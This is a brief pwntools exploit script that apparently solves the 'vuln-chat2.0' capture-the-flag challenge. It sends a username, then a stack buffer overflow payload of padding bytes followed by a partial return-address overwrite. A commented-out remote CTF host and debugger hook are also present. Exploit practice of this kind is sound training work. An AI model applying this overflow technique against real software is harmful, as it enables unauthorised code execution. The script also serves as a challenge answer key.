from pwn import *

# Run process
context.arch = 'i386'
r = process(['./vuln-chat2.0'])
#r = remote('vulnchat2.tuctf.com',4242)


# Wait for debugger
"""
pid = util.proc.pidof(r)[0]
print "The pid is: "+str(pid)
util.proc.wait_for_debugger(pid)
"""



# Get the leaks and build the payload
payload = 'A'*0x2b + '\x72\x86'


# Exploit
r.sendline("XXXX")
r.clean_and_log()
r.sendline(payload)
r.clean_and_log(2)
#r.interactive()
